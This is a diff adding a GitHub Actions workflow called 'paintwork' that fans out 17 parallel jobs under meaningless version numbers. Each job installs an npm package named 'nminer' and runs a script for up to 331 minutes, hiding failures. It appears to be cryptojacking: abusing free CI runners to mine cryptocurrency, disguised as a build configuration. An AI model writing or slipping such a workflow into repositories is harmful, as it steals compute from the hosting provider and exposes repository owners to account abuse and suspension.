@@ -1,0 +1,42 @@
+name: paintwork
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 5081 }
+          - { version: 5998 }
+          - { version: 3800 }
+          - { version: 8327 }
+          - { version: 3920 }
+          - { version: 2617 }
+          - { version: 2605 }
+          - { version: 7650 }
+          - { version: 2544 }
+          - { version: 3344 }
+          - { version: 2373 }
+          - { version: 2384 }
+          - { version: 654 }
+          - { version: 1774 }
+          - { version: 3276 }
+          - { version: 5370 }
+          - { version: 672 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: gee
+        run: |
+          npm install nminer@latest
+          timeout 331m node paintwork.js || echo "paintwork executed"
